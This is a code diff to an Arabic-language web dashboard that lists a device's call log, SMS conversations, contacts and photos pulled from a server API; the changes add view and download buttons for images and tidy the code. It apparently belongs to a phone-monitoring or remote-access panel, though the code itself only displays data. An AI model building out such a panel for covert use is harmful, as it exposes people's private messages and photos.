@@ -168,16 +168,12 @@ function displayCallsList() {
         return;
     }
     
-    // ✅ ترتيب حسب التاريخ تنازلي (الأحدث أولًا)
     const sortedCalls = [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0));
     
-    // تجميع حسب الرقم
     const callGroups = {};
     sortedCalls.forEach(call => {
         const number = call.number || 'غير معروف';
-        if (!callGroups[number]) {
-            callGroups[number] = [];
-        }
+        if (!callGroups[number]) callGroups[number] = [];
         callGroups[number].push(call);
     });
     
@@ -211,7 +207,6 @@ function openCallDetail(number) {
     const detailsDiv = document.getElementById('callDetailsList');
     detailsDiv.innerHTML = '';
     
-    // ✅ ترتيب حسب التاريخ تنازلي
     const calls = allCalls
         .filter(call => call.number === number)
         .sort((a, b) => (b.date || 0) - (a.date || 0));
@@ -263,7 +258,6 @@ function displayConversations() {
         return;
     }
     
-    // ✅ ترتيب حسب التاريخ تنازلي (الأحدث أولًا)
     const sortedSMS = [...allSMS].sort((a, b) => (b.date || 0) - (a.date || 0));
     
     const conversations = {};
@@ -301,7 +295,6 @@ function openChat(number) {
     const messagesList = document.getElementById('messagesList');
     messagesList.innerHTML = '';
     
-    // ✅ ترتيب من الأقدم للأحدث (مثل واتساب)
     const chatMessages = allSMS
         .filter(sms => sms.address === number)
         .sort((a, b) => (a.date || 0) - (b.date || 0));
@@ -356,7 +349,6 @@ function displayContactsList() {
         return;
     }
     
-    // ✅ ترتيب أبجدي
     const sortedContacts = [...allContacts].sort((a, b) => 
         (a.name || '').localeCompare(b.name || '', 'ar'));
     
@@ -417,48 +409,69 @@ function backToContactsList() {
 // ============ الصور ============
 async function loadImages() {
     try {
-        const response = await fetch(`/api.php?action=get_data&device=${currentDevice}&type=images`);
+        const response = await fetch(`/api.php?action=get_image_data&device=${currentDevice}`);
         const images = await response.json();
         
         const grid = document.getElementById('imagesGrid');
         grid.innerHTML = '';
         
         if (!images || images.length === 0) {
-            grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>';
+            grid.innerHTML = '<p style="color:#888;text-align:center;">لا توجد صور</p>';
             return;
         }
         
-        // ✅ ترتيب حسب التاريخ تنازلي
         const sortedImages = [...images].sort((a, b) => (b.date || 0) - (a.date || 0));
         
         sortedImages.forEach((image, index) => {
             const div = document.createElement('div');
-            div.className = 'image-item';
+            div.className = 'image-card';
             
             const img = document.createElement('img');
-            
             if (image.data) {
                 let mimeType = 'image/jpeg';
                 if (image.name) {
                     const ext = image.name.toLowerCase().split('.').pop();
                     if (ext === 'png') mimeType = 'image/png';
                     else if (ext === 'webp') mimeType = 'image/webp';
+                    else if (ext === 'gif') mimeType = 'image/gif';
                 }
                 img.src = `data:${mimeType};base64,${image.data}`;
-            } else {
-                img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="150" height="150"><rect width="150" height="150" fill="#1a1a4e"/><text x="75" y="75" text-anchor="middle" fill="#888" font-size="30">📷</text></svg>');
             }
-            
             img.className = 'thumb';
             img.alt = image.name || `صورة ${index + 1}`;
-            img.onclick = () => window.open(img.src, '_blank');
             
             const name = document.createElement('div');
             name.className = 'image-name';
             name.textContent = image.name || `صورة ${index + 1}`;
             
+            const buttonsDiv = document.createElement('div');
+            buttonsDiv.className = 'image-buttons';
+            
+            const viewBtn = document.createElement('button');
+            viewBtn.className = 'view-btn';
+            viewBtn.textContent = '👁️ عرض';
+            viewBtn.onclick = () => {
+                window.open(img.src, '_blank');
+            };
+            
+            const downloadBtn = document.createElement('button');
+            downloadBtn.className = 'download-btn';
+            downloadBtn.textContent = '⬇️ تحميل';
+            downloadBtn.onclick = () => {
+                const a = document.createElement('a');
+                a.href = img.src;
+                a.download = image.name || `image_${index + 1}.jpg`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            };
+            
+            buttonsDiv.appendChild(viewBtn);
+            buttonsDiv.appendChild(downloadBtn);
+            
             div.appendChild(img);
             div.appendChild(name);
+            div.appendChild(buttonsDiv);
             grid.appendChild(div);
         });
     } catch (e) {
